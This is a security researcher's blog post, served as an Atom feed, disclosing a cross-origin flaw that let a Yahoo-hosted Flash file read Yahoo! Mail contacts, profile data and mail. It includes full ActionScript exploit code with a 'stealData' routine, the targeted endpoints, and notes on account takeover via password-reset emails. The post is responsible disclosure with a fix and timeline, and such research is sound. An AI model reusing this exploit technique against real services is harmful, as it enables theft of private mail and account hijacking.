<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Yahoo | Defined Misbehaviour]]></title>
  <link href="http://blog.saynotolinux.com/blog/categories/yahoo/atom.xml" rel="self"/>
  <link href="http://blog.saynotolinux.com/"/>
  <updated>2014-12-10T17:17:27-04:00</updated>
  <id>http://blog.saynotolinux.com/</id>
  <author>
    <name><![CDATA[Jordan Milne]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Seizing Control of Yahoo! Mail Cross-Origin... Again]]></title>
    <link href="http://blog.saynotolinux.com/blog/2014/12/09/seizing-control-of-yahoo-mail-cross-origin-again/"/>
    <updated>2014-12-09T07:56:01-04:00</updated>
    <id>http://blog.saynotolinux.com/blog/2014/12/09/seizing-control-of-yahoo-mail-cross-origin-again</id>
    <content type="html"><![CDATA[<p><em>This is a follow-up to another article about crossorigin mail theft on Yahoo! Mail using Flash. For a better understanding of the issue, you can read that here: <a href="http://blog.saynotolinux.com/blog/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email/">http://blog.saynotolinux.com/blog/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email/</a></em></p>

<h2>TL;DR</h2>

<p>A .swf on Yahoo&rsquo;s CDN had a vulnerability that enabled near-complete control over Yahoo! Mail crossorigin. The .swf itself is fixed, but the configuration issue that allowed a .swf completely unrelated to Yahoo! Mail to do something like that still exists.</p>

<h2>The Issue</h2>

<p>So, in the last article we established that YMail&rsquo;s <code>crossdomain.xml</code> rules are incredibly lax:</p>

<pre><code class="xml">&lt;crossorigin-policy&gt;
    &lt;allow-access-from domain="*.yahoo.com" secure="false"/&gt;
    &lt;allow-access-from domain="l.yimg.com" secure="false"/&gt;
    &lt;allow-access-from domain="s.yimg.com" secure="false"/&gt;
&lt;/crossorigin-policy&gt;
</code></pre>

<p>They allow .swfs on any subdomain of <code>yahoo.com</code> to read resources on YMail crossorigin. Last time we abused a crossorigin proxy on <code>hk.promotions.yahoo.com</code> to serve up our own .swf that would request pages from YMail and leak them back to us. The crossorigin proxy has since been patched, but the loose <code>crossdomain.xml</code> rules remain. Assuming there&rsquo;s no way for us to serve our own .swf through <code>yahoo.com</code> anymore, how can we exploit these rules without using MITM attacks? Well, we abuse vulnerabilities in .swfs that are <em>legitimately</em> hosted on subdomains of <code>yahoo.com</code>.</p>

<p>Let&rsquo;s look for a .swf that will allow us to make arbitrary requests, and read the response. With a little searching we find a good candidate, <a href="https://sp.yimg.com/dv/i/izmo/engine/hotspotgallery/hotspotgallery.swf">hotspotgallery.swf</a>, related to a feature on Yahoo! Autos that gives 3D tours of cars. Normally it&rsquo;s served up on <code>sp.yimg.com</code>, which isn&rsquo;t a domain allowed by YMail&rsquo;s <code>crossdomain.xml</code>, but with a little finagling we find that the same .swf <a href="http://img.autos.yahoo.com/i/izmo/engine/hotspotgallery/hotspotgallery.swf">can also be accessed on img.autos.yahoo.com</a>.</p>

<!--more-->


<p><a href="/images/posts/ymail_again/hotspotgallery.png"><img class="center" src="/images/posts/ymail_again/hotspotgallery.png" width="640" height="480"></a></p>

<p>Let&rsquo;s take a peek at <a href="https://gist.github.com/JordanMilne/145722dd2ca31bc96f86">the ActionScript from the decompiler</a> to see why this .swf is useful to us:</p>

<pre><code class="actionscript">public dynamic class MainTimeline extends MovieClip {
    // ... snip
    function frame1(){
        Security.allowDomain("*");
        // ... snip
    } 
}
</code></pre>

<p>Immediately we notice the <code>Security.allowDomain("*")</code>, which is usually not a good sign. The reason for that is Flash has a feature where you can embed a crossorigin .swf inside your own. You can access and call the public members of the embedded .swf&rsquo;s <code>MovieClip</code> object, but normally this is disallowed unless the embedding .swf is same-origin with it. </p>

<p><code>Security.allowDomain()</code> allows you to relax that restriction for specific domains, and this .swf is saying .swfs from <em>any</em> domain can access its <code>MovieClip</code>&rsquo;s public members. <code>Security.allowDomain("*")</code> isn&rsquo;t necessarily a security issue on its own, unless your .swf&rsquo;s public members do or store something security sensitive. Now, this .swf <em>is</em> vulnerable, and to see why we&rsquo;ll look at the <code>loadXML2()</code> method:</p>

<pre><code class="actionscript">public dynamic class MainTimeline extends MovieClip {
    public var exteriorXML:String;
    public var DATA3:XML;
    public var dataPath; 
    // ... snip
    public function loadXML2():void{
        var ldr:* = null;
        var loader_IO_ERROR:* = null;
        var ldrEventHandler:* = null;
        loader_IO_ERROR = function ():void{
        };
        ldrEventHandler = function (_arg1:Event):void{
            DATA3 = new XML(_arg1.target.data);
            temp.text = DATA3;
            loadAnim((enginePath + "/angfront.swf"), -10, -10);
        };
        ldr = new URLLoader();
        try {
            ldr.load(new URLRequest(dataPath + "/" + exteriorXML1));
        } catch(error:SecurityError) {
            trace("A SecurityError has occurred.");
        };
        ldr.addEventListener(IOErrorEvent.IO_ERROR, loader_IO_ERROR);
        ldr.addEventListener(Event.COMPLETE, ldrEventHandler);
    }
    // ... snip
}
</code></pre>

<p>As you can see, the code makes a request to <code>this.dataPath</code> concatenated with <code>this.exteriorXML1</code>.  When it gets a response, it parses it as XML, and stores the result in <code>this.DATA3</code>. But we control all 3 of those members, and can both read from <em>and</em> write to them from .swfs on our domain because they use the <code>public</code> access modifier, and the .swf&rsquo;s said anyone can access public members. Given that we control the URL requested, can read the response, and can trigger the behaviour at will, all from a crossorigin Flash document, we&rsquo;ve got crossorigin data leakage!</p>

<p>Well&hellip; with a few caveats:</p>

<ul>
<li>The target endpoint must respond to <code>GET</code>s</li>
<li>If the response has angle brackets in it and it isn&rsquo;t syntactically correct XML, we probably can&rsquo;t get the response. The reason for that is the response is run through the XML constructor and it simply throws in the case of invalid XML. Luckily, Flash considers JSON without angle brackets to be valid XML and treats it as a single TextNode, so some JSON can still be leaked.</li>
<li>We can&rsquo;t get the response if the status code is non-200 since this code only stores the response in the success case.</li>
<li>The endpoint can&rsquo;t require an auth token we can&rsquo;t guess</li>
</ul>


<h2>First Steps</h2>

<p>Let&rsquo;s start by making some ActionScript to embed and exploit <code>hotspotgallery.swf</code>. From here on you will need to be logged in to Yahoo! for some links to work. Here we&rsquo;ve got a very simple JS<->Flash proxy in the style of CrossXHR. It loads up the vulnerable .swf, sets its public members so it&rsquo;ll request the resource we want to leak, then returns the response back to JS:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
</pre></td><td class='code'><pre><code class='actionscript'><span class='line'><span class="kd">package</span> <span class="p">{</span>
</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">display</span><span class="p">.</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;;</span>
</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">events</span><span class="p">.</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;;</span>
</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">external</span><span class="p">.</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;;</span>
</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">net</span><span class="p">.</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;;</span>
</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">text</span><span class="p">.</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;;</span>
</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;;</span>
</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">system</span><span class="p">.</span><span class="o">*;&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="kd">public</span> <span class="kd">class</span> <span class="nx">YahooFlasher</span> <span class="kd">extends</span> <span class="nb">MovieClip</span> <span class="p">{</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;//</span> <span class="nx">Vulnerable</span> <span class="nx">SWF</span> <span class="nx">to</span> <span class="nx">make</span> <span class="nx">our</span> <span class="nx">requests</span> <span class="nx">through</span>
</span><span class='line'><span class="kd">private</span> <span class="kd">static</span> <span class="kd">const</span> <span class="nx">PROXY_URL</span><span class="o">:</span><span class="nb">String</span> <span class="o">=</span> <span class="s2">&quot;http://img.autos.yahoo.com/i/izmo/engine/hotspotgallery/hotspotgallery.swf&quot;</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Get just the origin from a fully-qualified URL</span>
</span><span class='line'><span class="kd">private</span> <span class="kd">static</span> <span class="kd">const</span> <span class="nx">ORIGIN_REGEX</span><span class="o">:</span><span class="nb">RegExp</span> <span class="o">=</span> <span class="sr">/^(\w+:\/\/[^\/]+\/).*/</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'><span class="kd">public</span> <span class="kd">function</span> <span class="nx">YahooFlasher</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">addEventListener</span><span class="p">(</span><span class="nb">Event</span><span class="p">.</span><span class="nx">ADDED_TO_STAGE</span><span class="o">,</span> <span class="nx">onAdded</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">private</span> <span class="kd">function</span> <span class="nx">onAdded</span><span class="p">(</span><span class="nx">e</span><span class="o">:</span><span class="nb">Event</span><span class="p">)</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// Set timeout to avoid syncronous issues</span>
</span><span class='line'>    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">available</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="c1">// Let&#39;s not make *ourselves* vulnerable to weird exploits.</span>
</span><span class='line'>            <span class="k">var</span> <span class="nx">swfOrigin</span><span class="o">:</span><span class="nb">String</span> <span class="o">=</span> <span class="nx">loaderInfo</span><span class="p">.</span><span class="nx">url</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">ORIGIN_REGEX</span><span class="o">,</span> <span class="s2">&quot;$1&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">ORIGIN_REGEX</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">swfOrigin</span><span class="p">)</span> <span class="o">||</span> <span class="nx">swfOrigin</span> <span class="o">!=</span> <span class="nb">Security</span><span class="p">.</span><span class="nx">pageDomain</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="s2">&quot;alert&quot;</span><span class="o">,</span> <span class="s2">&quot;AY! This .swf needs to be on the same page as the one embedding it!&quot;</span><span class="p">);</span>
</span><span class='line'>                <span class="k">return</span><span class="o">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>            <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">addCallback</span><span class="p">(</span><span class="s2">&quot;stealData&quot;</span><span class="o">,</span> <span class="nx">stealData</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="s2">&quot;flasherReady&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span><span class="o">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">public</span> <span class="kd">function</span> <span class="nx">stealData</span><span class="p">(</span><span class="nx">targetURL</span><span class="o">:</span><span class="nb">String</span><span class="o">,</span> <span class="nx">callback</span><span class="o">:</span><span class="nb">String</span><span class="p">)</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">///</span>
</span><span class='line'>    <span class="c1">/// Steal data through the proxy SWF, response body must look like</span>
</span><span class='line'>    <span class="c1">/// valid XML and status code must not be &amp;gt;= 400.</span>
</span><span class='line'>    <span class="c1">///</span>
</span><span class='line'>    <span class="k">var</span> <span class="nx">ldrComplete</span><span class="o">:</span><span class="nb">Function</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">_arg1</span><span class="o">:</span><span class="nb">Event</span><span class="p">)</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span><span class="p">{</span>
</span><span class='line'>            <span class="k">var</span> <span class="nx">proxyClip</span><span class="o">:</span><span class="nb">Object</span> <span class="o">=</span> <span class="nx">MCLoader</span><span class="p">.</span><span class="nx">content</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'>            <span class="c1">// This thing&#39;s all janked and the request will be made to dataPath + &quot;/&quot; + exteriorXML1.</span>
</span><span class='line'>            <span class="c1">// Try to make it so that this won&#39;t affect our target.</span>
</span><span class='line'>            <span class="k">var</span> <span class="nx">splitURL</span><span class="o">:</span><span class="nb">Array</span> <span class="o">=</span> <span class="nx">targetURL</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
</span><span class='line'>            <span class="nx">proxyClip</span><span class="p">.</span><span class="nx">dataPath</span> <span class="o">=</span> <span class="nx">splitURL</span><span class="p">.</span><span class="nx">shift</span><span class="p">();</span>
</span><span class='line'>            <span class="nx">proxyClip</span><span class="p">.</span><span class="nx">exteriorXML1</span> <span class="o">=</span> <span class="nx">splitURL</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>            <span class="c1">// Triggers the HTTP Request through the vulnerable SWF</span>
</span><span class='line'>            <span class="nx">proxyClip</span><span class="p">.</span><span class="nx">loadXML2</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">var</span> <span class="nx">timeLimit</span><span class="o">:</span><span class="nb">Number</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">getTime</span><span class="p">()</span> <span class="o">+</span> <span class="mi">10000</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'>            <span class="c1">// Keep checking if the data&#39;s been loaded,</span>
</span><span class='line'>            <span class="c1">// If `new XML(response)` raises, this will never be true,</span>
</span><span class='line'>            <span class="c1">// the response has to look like valid XML, but most JSON</span>
</span><span class='line'>            <span class="c1">// resources work too. Maybe because it sees it as one big </span>
</span><span class='line'>            <span class="c1">// top-level TextNode?</span>
</span><span class='line'>            <span class="kd">function</span> <span class="nx">checkFinished</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
</span><span class='line'>                <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
</span><span class='line'>                    <span class="k">var</span> <span class="nx">stolenXML</span><span class="o">:</span><span class="nb">XML</span> <span class="o">=</span> <span class="nx">proxyClip</span><span class="p">.</span><span class="nx">DATA3</span><span class="o">;</span>
</span><span class='line'>                    <span class="k">if</span><span class="p">(</span><span class="nx">stolenXML</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                        <span class="k">var</span> <span class="nx">ret</span><span class="o">:</span><span class="nb">String</span><span class="o">;</span>
</span><span class='line'>                        <span class="c1">// If we get a simple node with no name, it&#39;s probably not even XML.</span>
</span><span class='line'>                        <span class="c1">// Get the string representation without XML escaping.</span>
</span><span class='line'>                        <span class="k">if</span><span class="p">(</span><span class="nx">stolenXML</span><span class="p">.</span><span class="nx">name</span><span class="p">()</span> <span class="o">||</span> <span class="nx">stolenXML</span><span class="p">.</span><span class="nx">hasComplexContent</span><span class="p">())</span>
</span><span class='line'>                            <span class="nx">ret</span> <span class="o">=</span> <span class="nx">stolenXML</span><span class="p">.</span><span class="nx">toXMLString</span><span class="p">();</span>
</span><span class='line'>                        <span class="k">else</span>
</span><span class='line'>                            <span class="nx">ret</span> <span class="o">=</span> <span class="nx">stolenXML</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>                        <span class="k">if</span><span class="p">(</span><span class="nx">callback</span><span class="p">)</span>
</span><span class='line'>                            <span class="c1">// Flash can&#39;t be trusted to serialize `ret` properly. Just encode it.</span>
</span><span class='line'>                            <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">callback</span><span class="o">,</span> <span class="nx">encodeURIComponent</span><span class="p">(</span><span class="nx">ret</span><span class="p">));</span>
</span><span class='line'>                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                        <span class="c1">// Hit a timeout when trying to fetch the response. Either a non-200 status code</span>
</span><span class='line'>                        <span class="c1">// was returned, or we couldn&#39;t parse the body as XML :(</span>
</span><span class='line'>                        <span class="k">if</span><span class="p">(</span><span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">getTime</span><span class="p">()</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="o">;</span> <span class="nx">timeLimit</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                            <span class="k">if</span><span class="p">(</span><span class="nx">callback</span><span class="p">)</span>
</span><span class='line'>                                <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">callback</span><span class="o">,</span> <span class="kc">null</span><span class="p">);</span>
</span><span class='line'>                        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                            <span class="nx">checkFinished</span><span class="p">();</span>
</span><span class='line'>                        <span class="p">}</span>
</span><span class='line'>                    <span class="p">}</span>
</span><span class='line'>                <span class="p">}</span><span class="o">,</span> <span class="mi">10</span><span class="p">);</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>            <span class="nx">checkFinished</span><span class="p">();</span>
</span><span class='line'>        <span class="p">}</span><span class="o">,</span> <span class="mi">100</span><span class="p">);</span>
</span><span class='line'>    <span class="p">};</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// Load up the vulnerable proxy SWF</span>
</span><span class='line'>    <span class="k">var</span> <span class="nx">MCLoader</span><span class="o">:</span><span class="nb">Loader</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Loader</span><span class="p">();</span>
</span><span class='line'>    <span class="nx">MCLoader</span><span class="p">.</span><span class="nx">load</span><span class="p">(</span><span class="k">new</span> <span class="nb">URLRequest</span><span class="p">(</span><span class="nx">PROXY_URL</span><span class="p">));</span>
</span><span class='line'>    <span class="nx">MCLoader</span><span class="p">.</span><span class="nx">contentLoaderInfo</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="nb">Event</span><span class="p">.</span><span class="nx">COMPLETE</span><span class="o">,</span> <span class="nx">ldrComplete</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Now here&rsquo;s the tricky part. We need to find interesting, leakable endpoints. We can&rsquo;t leak them if they return invalid XML (ruling out most webpages and JSON containing HTML fragments,) we can&rsquo;t leak them if they return a non-200 status code, and we can&rsquo;t leak them if they require an auth token we can&rsquo;t guess.</p>

<p><a href="https://ca-mg6.mail.yahoo.com/neo/ws/sd?/v1/user/me/contacts;count=max;sort=asc?format=json&amp;view=compact&amp;_sc=1">Some</a> alternative <a href="https://ca-mg6.mail.yahoo.com/neo/ws/sd?/v1/user/me/profile;count=max;sort=asc?format=json&amp;_sc=1">endpoints</a> for the <a href="https://developer.yahoo.com/social/">Social API</a> fit the bill nicely. They let us fetch the current user&rsquo;s contacts and profile without requiring an auth token or user ID. You can see those leaking to a page we control here:</p>

<p><a href="/images/posts/ymail_again/justsocialstuff.png"><img class="center" src="/images/posts/ymail_again/justsocialstuff.png" width="640" height="480"></a></p>

<h2>But What About Mail?</h2>

<p>One that stumped me for a long time was getting the user&rsquo;s mail. All of the endpoints for mail listings required a valid WSSID (web services session id?) Unfortunately, all the endpoints I could find that would give me one had non-200 response codes or wouldn&rsquo;t parse as XML. I eventually found what I was looking for by running YMail&rsquo;s android app through mitmproxy. <a href="https://m.mg.mail.yahoo.com/hg/controller/controller.php">Here you can see the WSSID we wanted</a>, returned with a 200 response code. Even though this endpoint&rsquo;s normally requested with a <code>POST</code> method, a <code>GET</code> with no params still gives us the WSSID&hellip; Sweet!</p>

<p><a href="/images/posts/ymail_again/ymail-mitm.png"><img class="center" src="/images/posts/ymail_again/ymail-mitm.png" width="640" height="480"></a></p>

<p>Let&rsquo;s leak the user&rsquo;s mail now. We&rsquo;ve got <a href="https://ca-mg6.mail.yahoo.com/mailsearch/v2/search?appid=YahooMailNeo&amp;wssid=PUT_WSSID_HERE&amp;sorting=-date&amp;query=%7B%22keyword%22%3A%22http%22%2C%22group%22%3A%7B%22from%22%3A%7B%7D%2C%22folder%22%3A%7B%7D%2C%22flags%22%3A%7B%22order%22%3A%22desc%22%7D%2C%22attachmenttype%22%3A%7B%7D%2C%22date%22%3A%7B%22unit%22%3A%22year%22%7D%7D%2C%22flags%22%3A%7B%22softdelete%22%3A0%7D%7D">a mail search endpoint here</a> that will return mail fragments without embedded HTML. You can see you&rsquo;ll still sometimes get angle brackets in the response due to inline replies, but you can muck with the query to get around those.</p>

<p><a href="/images/posts/ymail_again/search-endpoint.png"><img class="center" src="/images/posts/ymail_again/search-endpoint.png" width="640" height="480"></a></p>

<p>Now, that WSSID functions as a CSRF token as well, so we can now do anything we want as the current user. We can send mail as them, delete all their emails, basically anything a normal user can do.</p>

<p>Here&rsquo;s a small page demonstrating a bunch of things we can do as long as the user is on a page we control. As you can see, We&rsquo;ve got the full list of contacts, all of the user&rsquo;s personal details including their email address and name, and a listing of their emails.</p>

<p><a href="/images/posts/ymail_again/show-all.png"><img class="center" src="/images/posts/ymail_again/show-all.png" width="640" height="480"></a></p>

<p>We&rsquo;ve got enough for a fully-weaponized exploit at this point. We can not only leak their emails, we can also achieve lateral movement by triggering password resets on other services they use, and pulling the reset URLs right out of their email, then deleting them. Of course, previously emailed username/password combos are fair game, too. Very handy for the APT folks ;)</p>

<h2>The Fix</h2>

<p><code>hotspotgallery.swf</code>&rsquo;s allowDomain call has since been changed to <code>Security.allowDomain("sp.yimg.com")</code>, but that doesn&rsquo;t fix the core issue. There are thousands and thousands of forgotten .swfs on disused subdomains, many of which are probably vulnerable to similar exploits. As long as those <code>crossdomain.xml</code> rules are as loose as they are, it&rsquo;s only a matter of time before someone finds one and exploits YMail&hellip; again.</p>

<p>.swfs that actually need crossorigin access to YMail should be moved to the existing <code>mail.yimg.com</code> subdomain, and the <code>crossdomain.xml</code> should be tightened up to keep YMail safe from rogue galleries of Asian imports and pet shows.</p>

<h2>About Yahoo!&rsquo;s Initial Response</h2>

<p>The other thing I want to mention is the initial response I got. I initially submitted an overview of the issue and attached a proof-of-concept that put the JSON from the contacts endpoint in a textbox. Very rudimentary, but sufficient to show crossorigin data leakage. All I got in response was a form reply basically saying &ldquo;This is intended behaviour, wontfix&rdquo;. I replied asking why they thought that, and if they had any issues reproducing the issue, but didn&rsquo;t receive a reply.</p>

<p>I know that reproing Flash issues can be a pain in the ass, and I realized the PoC would break if served from localhost, so I hosted a version with no setup required that more clearly showed what was leaked. I posted a link to the new PoC, reiterating what was being leaked. Still no response. It wasn&rsquo;t until I posted the version that leaked mail contents 8 months later that I got an unscripted reply.</p>

<p>I get that Yahoo! probably receives tons of spurious reports every day, but without something actionable like &ldquo;I don&rsquo;t think X is a bug because Y&rdquo; or &ldquo;I&rsquo;m unable to reproduce the issue, Z happens instead&rdquo;, reporters don&rsquo;t have anything to go on if they&rsquo;re reporting a genuine issue. Without any feedback on what the issue is with the report, their only way to potentially get the bug fixed is through public disclosure (which an operator of a bug bounty probably doesn&rsquo;t want.) I also know this isn&rsquo;t an isolated case, since I recently saw a presentation where an RCE on Yahoo!&rsquo;s reverse proxies got the same treatment.</p>

<p>To Yahoo&rsquo;s credit, the fellow who responded to my updated proof-of-concept was decently communicative, but every response I&rsquo;d ever received from Yahoo up &lsquo;til that point had been a scripted response of &ldquo;fixed&rdquo;, &ldquo;wontfix&rdquo;, &ldquo;confirmed&rdquo;, or &ldquo;new&rdquo;. When I work with a company (either as a consultant or just through one-off reports,) nothing impresses me more than engineers responding with additional details relevant to my reports, and nothing turns me off more than the company being difficult to communicate with, money or no.</p>

<h2>Tips For Yahoo! Bug Bounty Participants</h2>

<ul>
<li>Until the <code>crossdomain.xml</code>s are fixed, .swfs and endpoints where the whole response body is controlled are extra-juicy targets</li>
<li>.swfs normally served from random subdomains of <code>yimg.com</code> may also be available on <code>l.yimg.com</code>, or even subdomains of <code>yahoo.com</code></li>
<li>There are plenty of versioned .swfs (think branded video players and such) where the old versions are still live on <code>yimg.com</code>. I never bothered auditing them because they&rsquo;re a pain to trace through, but the WayBack machine is your friend when it comes to finding these orphaned .swfs</li>
<li>As usual, endpoints for mobile apps represent some extra attack surface to play with, and a lot of them use regular cookie auth. Set up mitmproxy or burp and go nuts.</li>
</ul>


<h2>Disclosure Timeline</h2>

<ul>
<li>2014-02-09: Reported issue to vendor with PoC showing contacts leakage</li>
<li>2014-02-14: Vendor closed issue as expected behaviour</li>
<li>2014-02-14: Requested clarification from vendor</li>
<li>2014-03-01: Sent vendor a link to updated PoC with no setup required</li>
<li>2014-10-30: Requested public disclosure through HackerOne</li>
<li>2014-11-04: Sent vendor a link to updated PoC showing mail leaking</li>
<li>2014-11-07: Vendor confirmed, reopened issue</li>
<li>2014-11-11: <a href="https://www.youtube.com/watch?v=3Z3hF0bRsJc&amp;feature=youtu.be">Engaging multimedia experience</a> detailing issue sent to vendor, per request</li>
<li>2014-12-03: Vendor reported issue as fixed, awarded bounty of $2500</li>
